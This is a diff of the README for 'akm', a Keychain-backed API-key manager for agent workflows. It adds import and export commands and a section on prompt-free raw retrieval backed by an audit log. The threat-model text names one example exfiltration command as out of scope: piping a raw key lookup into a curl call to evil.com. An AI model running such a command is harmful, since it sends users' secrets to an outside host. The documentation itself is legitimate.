@@ -62,9 +62,11 @@ If you are the agent reading this: run `akm agent-info --json` and use it.
 |---|---|
 | `akm add NAME` | Store a key from stdin or argv. |
 | `akm get NAME` | Retrieve, masked. Pass `--raw` for the unmasked value. |
+| `akm import .env` | Migrate a `.env` file (or stdin) into the Keychain in one command. `--dry-run` to preview. |
+| `akm export` | Raw dump of all/selected keys for backup or migration — `--format env` for shell-safe `NAME=value` lines, `--only KEY,KEY` to filter. Audit-logged. |
 | `akm run --only NAME -- <cmd>` | Run `<cmd>` with named keys injected as env vars. Output redacted. |
 | `akm stdin NAME -- <cmd>` | Write the value to `<cmd>`'s stdin. Works with `vercel env add`, `gh secret set`, `flyctl secrets import`, and any tool that takes a secret on standard input. Output redacted. |
-| `akm list` | Print stored key names (never values). |
+| `akm list` | Print stored key names (never values). `--long` adds last-updated age per key and flags keys older than 90 days as stale (display only). |
 | `akm rm NAME` | Delete a key. |
 | `akm audit` | Print the append-only access log. |
 | `akm agent-info --json` | Machine-readable capability manifest. |
@@ -87,6 +89,8 @@ If you are the agent reading this: run `akm agent-info --json` and use it.
 **In scope:** plaintext `.env` files on disk, keys in shell history, keys in `ps -ef` argv listings, keys committed to git by an overeager agent, keys re-appearing in agent transcript context, build-tool printouts leaking secrets.
 
 **Out of scope:** malware running as your user; a hostile agent that runs `akm get NAME --raw && curl evil.com`; same-user `ps -E` of an `akm run` child (the env IS the transport). Those threats need a different tool. Every access is logged to `~/.akm/audit.log` (mode 0600) so you can review the trail after the fact.
+
+**Retrieval by design.** Keys are never locked away from you: `akm get --raw` and `akm export` return plaintext with zero prompts — no Touch ID, no confirmation dialogs, no master password. The control is the audit trail, not an access gate. This is a deliberate stance for agent-driven workflows: a human-approval prompt in an autonomous loop is either a denial of service or trained-away noise. If your threat model needs hardware-backed approval per read, use a different tool.
 
 ## Contributing
 
